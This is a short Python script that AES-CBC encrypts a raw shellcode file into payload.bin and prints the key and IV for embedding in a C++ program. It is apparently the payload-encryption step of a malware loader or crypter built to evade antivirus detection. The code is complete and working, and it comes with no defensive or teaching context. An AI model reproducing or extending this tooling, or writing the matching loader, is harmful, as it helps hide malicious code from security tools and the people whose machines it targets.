# encrypt_payload.py
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os

# Generate random 16-byte AES key and IV
key = os.urandom(16)
iv = os.urandom(16)

# Read raw shellcode
with open("shellcode.bin", "rb") as f:
    data = f.read()

# Encrypt using AES-CBC
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = cipher.encrypt(pad(data, 16))

# Write the encrypted payload
with open("payload.bin", "wb") as f:
    f.write(encrypted)

# Output AES key and IV in hex format for C++ embedding
print("KEY =", key.hex())
print("IV  =", iv.hex())
